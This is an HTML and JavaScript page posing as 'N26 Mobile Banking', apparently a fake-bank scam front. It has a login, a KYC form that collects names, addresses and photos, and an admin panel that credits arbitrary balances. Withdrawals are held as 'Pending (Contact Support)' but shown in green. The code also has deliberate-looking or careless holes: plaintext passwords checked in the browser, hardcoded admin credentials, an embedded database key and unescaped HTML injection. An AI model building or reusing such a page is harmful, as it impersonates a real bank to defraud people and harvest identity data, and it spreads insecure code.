<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>N26 Mobile Banking üè¶</title>

<!-- SUPABASE -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
*{box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{margin:0;background:#f2f4f8}
.hidden{display:none}

/* LOGIN */
#loginBox{
  max-width:360px;margin:120px auto;background:#fff;padding:30px;
  border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.1);
}
input,button{
  width:100%;padding:12px;margin:10px 0;border-radius:10px;border:1px solid #ccc;
}
button{background:#0052cc;color:#fff;font-weight:bold;border:none}
button:hover{background:#003d99}

/* HEADER */
header{
  background:#0052cc;color:#fff;padding:15px;display:flex;justify-content:space-between;align-items:center;
}
header span{font-size:22px;cursor:pointer}

/* SIDEBAR */
#sidebar{
  position:fixed;top:0;left:-240px;width:240px;height:100%;background:#002d72;color:#fff;padding:20px;transition:.3s;
}
#sidebar a{
  display:block;padding:14px;margin-bottom:10px;background:rgba(255,255,255,.1);
  color:#fff;border-radius:10px;text-decoration:none;
}
#sidebar.show{left:0}

/* PAGES */
.page{padding:20px}
.card{
  background:#fff;padding:20px;border-radius:15px;box-shadow:0 8px 20px rgba(0,0,0,.08);
  margin-bottom:20px;
}
table{width:100%;border-collapse:collapse}
th,td{border:1px solid #ccc;padding:8px;text-align:center}
th{background:#0052cc;color:#fff}
.green{color:green;font-weight:bold}
.orange{color:orange;font-weight:bold}
.red{color:red;font-weight:bold}
img{width:100px;height:100px;border-radius:50%;object-fit:cover}
</style>
</head>
<body>

<!-- LOGIN -->
<div id="loginBox">
  <h2 style="text-align:center">üîê Login</h2>
  <input id="lUser" placeholder="Username">
  <input id="lPass" type="password" placeholder="Password">
  <button onclick="login()">Login</button>
  <p id="loginMsg" style="color:red;text-align:center"></p>
</div>

<!-- APP -->
<div id="app" class="hidden">

<header>
  <span onclick="toggleMenu()">‚ò∞</span>
  <b id="welcome"></b>
</header>

<div id="sidebar">
  <a onclick="show('dashboard')">Dashboard</a>
  <a onclick="show('kyc')">KYC</a>
  <a onclick="show('history')">History</a>
  <a onclick="adminPrompt()">Admin Panel</a>
  <a onclick="logout()">Logout</a>
</div>

<!-- DASHBOARD -->
<div id="dashboard" class="page hidden">
  <div class="card" style="text-align:center">
    <img id="photo">
    <h3 id="name"></h3>
    <p>Account: <span id="acct"></span></p>
    <h2>$<span id="bal"></span></h2>
  </div>

  <div class="card">
    <input id="amt" type="number" placeholder="Amount">
    <select id="type">
      <option>Deposit</option>
      <option>Withdrawal</option>
    </select>
    <button onclick="placeTxn()">Submit</button>
  </div>
</div>

<!-- KYC -->
<div id="kyc" class="page hidden">
  <div class="card">
    <input id="kName" placeholder="Full Name">
    <input id="kAddr" placeholder="Withdrawal Address">
    <input type="file" id="kPhoto">
    <button onclick="saveKYC()">Submit KYC</button>
  </div>
</div>

<!-- HISTORY -->
<div id="history" class="page hidden">
  <div class="card">
    <div id="txList"></div>
  </div>
</div>

<!-- ADMIN -->
<div id="admin" class="page hidden">
  <div class="card">
    <h3>Create User</h3>
    <input id="cu" placeholder="Username">
    <input id="cp" placeholder="Password">
    <button onclick="createUser()">Create</button>
  </div>

  <div class="card">
    <h3>Fund User</h3>
    <input id="fu" placeholder="Username">
    <input id="fa" type="number" placeholder="Amount">
    <button onclick="fundUser()">Fund</button>
  </div>

  <div class="card">
    <h3>All Users & Transactions</h3>
    <table>
      <thead>
        <tr>
          <th>User</th><th>Password</th><th>Balance</th><th>Transactions</th><th>Action</th>
        </tr>
      </thead>
      <tbody id="adminTable"></tbody>
    </table>
  </div>
</div>

</div>

<script>
/* SUPABASE CONFIG */
const supabase = supabase.createClient(
  "https://mvgwrkpqauzntjtxhtdd.supabase.co",
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im12Z3dya3BxYXV6bnRqdHhodGRkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwNDE0NDcsImV4cCI6MjA4MTYxNzQ0N30.jtD2D0XXjCwiwysDApL_9375LzwFPVMpN63bTrmWzjU"
);

let currentUser=null;

/* LOGIN */
async function login(){
  const u=lUser.value,p=lPass.value;
  const {data}=await supabase.from("users").select("*").eq("username",u).eq("password",p).single();
  if(!data){loginMsg.innerText="Invalid login";return}
  currentUser=data;
  loginBox.style.display="none";
  app.classList.remove("hidden");
  welcome.innerText="Welcome "+u;
  loadDash();
}

/* DASHBOARD */
function loadDash(){
  show("dashboard");
  name.innerText=currentUser.full_name||currentUser.username;
  acct.innerText=currentUser.account_number||currentUser.username+"-"+Math.floor(Math.random()*9000+1000);
  bal.innerText=currentUser.balance;
  photo.src=currentUser.photo||"";
  loadHistory();
}

/* MENU */
function toggleMenu(){sidebar.classList.toggle("show")}
function show(id){
  document.querySelectorAll(".page").forEach(p=>p.classList.add("hidden"));
  document.getElementById(id).classList.remove("hidden");
  sidebar.classList.remove("show");
}

/* KYC */
async function saveKYC(){
  if(currentUser.full_name){alert("KYC already submitted");return}
  const reader=new FileReader();
  reader.onload=async()=>{
    const acct = currentUser.account_number || currentUser.username+"-"+Math.floor(Math.random()*9000+1000);
    await supabase.from("users").update({
      full_name:kName.value,
      account_number:acct,
      address:kAddr.value,
      photo:reader.result
    }).eq("id",currentUser.id);
    alert("KYC Successful");
    location.reload();
  }
  reader.readAsDataURL(kPhoto.files[0]);
}

/* TRANSACTIONS */
async function placeTxn(){
  if(!amt.value){alert("Enter amount"); return;}
  await supabase.from("transactions").insert({
    username:currentUser.username,
    type:type.value,
    amount:amt.value,
    status:type.value=="Deposit"?"Successful":"Pending (Contact Support)"
  });
  alert("Transaction Submitted");
  loadHistory();
}

async function loadHistory(){
  const {data}=await supabase.from("transactions").select("*").eq("username",currentUser.username);
  txList.innerHTML="";
  data.forEach(t=>{
    const cls=t.status.includes("Pending")?"green":t.status.includes("Successful")?"green":"red";
    txList.innerHTML+=`<p>${t.type} $${t.amount} - <span class="${cls}">${t.status}</span></p>`;
  })
}

/* ADMIN */
function adminPrompt(){
  const u=prompt("Admin Username");
  const p=prompt("Admin Password");
  if(u==="admin"&&p==="Admin1234!"){show("admin");loadAdmin()}
  else alert("Denied");
}

async function createUser(){
  if(!cu.value || !cp.value){alert("Enter username & password"); return;}
  const acct = cu.value+"-"+Math.floor(Math.random()*9000+1000);
  await supabase.from("users").insert({username:cu.value,password:cp.value,balance:0,account_number:acct});
  alert("User created successfully");
  cu.value=""; cp.value="";
  loadAdmin();
}

async function fundUser(){
  if(!fu.value || !fa.value){alert("Enter username & amount"); return;}
  const {data}=await supabase.from("users").select("*").eq("username",fu.value).single();
  if(!data){alert("User not found"); return;}
  await supabase.from("users").update({balance:+data.balance+ +fa.value}).eq("id",data.id);
  await supabase.from("transactions").insert({username:fu.value,type:"Deposit",amount:fa.value,status:"Successful"});
  alert("User funded successfully");
  fu.value=""; fa.value="";
  loadAdmin();
}

async function loadAdmin(){
  const {data:users}=await supabase.from("users").select("*");
  const {data:tx}=await supabase.from("transactions").select("*");
  adminTable.innerHTML="";
  users.forEach(u=>{
    const userTx=tx.filter(t=>t.username==u.username);
    const txHtml = userTx.map((t,i)=>`
      ${t.type} $${t.amount} (<span class="${t.status.includes('Pending')?'green':t.status.includes('Successful')?'green':'red'}">${t.status}</span>) 
      ${t.status.includes("Pending")?`<button onclick="approveTxn(${i},'${u.username}')">‚úî</button> <button onclick="rejectTxn(${i},'${u.username}')">‚úñ</button>`:""}
    `).join("<br>");
    adminTable.innerHTML+=`
      <tr>
        <td>${u.username}</td>
        <td>******</td>
        <td>${u.balance}</td>
        <td>${txHtml}</td>
        <td></td>
      </tr>`;
  })
}

/* APPROVE/REJECT TRANSACTION */
async function approveTxn(index,username){
  const {data:tx}=await supabase.from("transactions").select("*").eq("username",username);
  const t = tx[index];
  await supabase.from("transactions").update({status:"Successful"}).eq("id",t.id);
  if(t.type=="Withdrawal") {
    const {data:user}=await supabase.from("users").select("*").eq("username",username).single();
    await supabase.from("users").update({balance:user.balance - +t.amount}).eq("id",user.id);
  }
  loadAdmin();
  if(currentUser.username==username) loadHistory();
}

async function rejectTxn(index,username){
  const {data:tx}=await supabase.from("transactions").select("*").eq("username",username);
  const t = tx[index];
  await supabase.from("transactions").update({status:"Rejected"}).eq("id",t.id);
  loadAdmin();
  if(currentUser.username==username) loadHistory();
}

/* LOGOUT */
function logout(){location.reload()}
</script>
</body>
</html>
